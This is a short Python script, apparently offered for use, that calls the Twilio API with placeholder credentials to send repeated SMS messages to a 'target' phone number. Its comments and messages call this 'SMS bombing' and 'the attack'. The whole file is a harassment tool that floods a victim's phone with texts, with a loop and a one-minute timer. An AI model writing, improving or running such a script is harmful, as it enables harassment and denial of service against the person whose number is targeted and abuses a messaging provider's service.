import time
from twilio.rest import Client

# Twilio account SID and auth token
account_sid = 'your_account_sid'
auth_token = 'your_auth_token'

# Twilio phone number
from_number = '03000000000'

# Target phone number
to_number = '03000000000'

# Message to send
message = 'Hello, this is a test message!'

# Create Twilio client
client = Client(account_sid, auth_token)

# Function to send SMS
def send_sms(to_number):
    try:
        message = client.messages.create(
            body='Hello, this is a test message!',
            from_=from_number,
            to=to_number
        )
        print(f'SMS sent to {to_number}')
    except Exception as e:
        print(f'Error: {str(e)}')

# SMS bombing loop
start_time = time.time()
while True:
    send_sms(to_number)
    user_input = input('Enter "stop" to stop the attack: ')
    if user_input.lower() == 'stop':
        break
    if time.time() - start_time >= 60:  # Check if 1 minute has passed
        break


print('SMS bombing stopped.')
